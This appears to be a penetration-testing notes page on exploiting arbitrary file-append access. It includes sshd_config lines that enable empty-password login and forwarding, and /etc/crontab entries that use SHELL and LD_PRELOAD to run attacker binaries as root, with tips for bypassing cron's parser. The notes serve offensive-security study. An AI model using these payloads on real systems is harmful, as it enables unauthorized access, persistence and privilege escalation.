# Append To Arbitrary File
* as root or user you can append data to a file and ...
	* fully control content
	* partially control content (eg. parts of a logfile)
	* none (empty file)

### sshd
Looking at a mostly-default sshd config file most things are commented out so anything you append will take precedence if there is not something already before it (TODO: add sources for order of parsing).  

#### Clean file ending
```
# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem	sftp	/usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server
```

#### Messy file ending (user specific and all users)
```
# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem	sftp	/usr/lib/openssh/sftp-server

# We can literally just uncomment that example
# password authentication enabled for key only servers
Match User knownaccount
	X11Forwarding yes
	AllowTcpForwarding yes
	PermitTTY yes
	PasswordAuthentication yes
	PermitEmptyPasswords yes
# not all of these may apply
AllowTcpForwarding yes
PermitTTY yes
PasswordAuthentication yes
PermitEmptyPasswords yes
```
### firefox
#### user.js
See the firefox prefs.js section in file-overwrite. The difference here is that changes can be made while the browser is open. 
### crontab
* requires `root` permissions
* file location `/etc/crontab`
* different cron variants exist https://pkgs.org/download/cron
* very strict syntax, no arbitrary text or bytes. Not even null-byte allowed
* comments start with `#`
* file has to end with a newline `\n`
* env variables assigned before cronjob line are set for the cronjob execution
	* use `SHELL` or `LD_PRELOAD` to execute a binary. File **must** be executable.

#### Clean File
* you can also set environment variable. But they have to be set before the cronjob
```
SHELL=/home/user/pwn
LD_PRELOAD=/home/user/lib.so
* * * * * root   (date;id) >> /tmp/crontab
@hourly root   (date;id) >> /tmp/crontab
```

#### Messy File
* see [`env.c` parsing](https://github.com/systemd-cron/crontab/blob/master/env.c#L132). if this fails to find an env var, it expects a crontab entry line.

```
fghr56%$^R4265ytd=invalid env var is ignored. But name must not contain space before = sign 8&$%(*& r5sa78d56rA&Ir67^RT%*x

SHELL=/home/user/pwn
LD_PRELOAD=/home/user/lib.so
* * * * * root   (date;id) >> /tmp/crontab

# this is a comment <00><ff> arbitrary bytes can be here
     # spaces are also fine
```
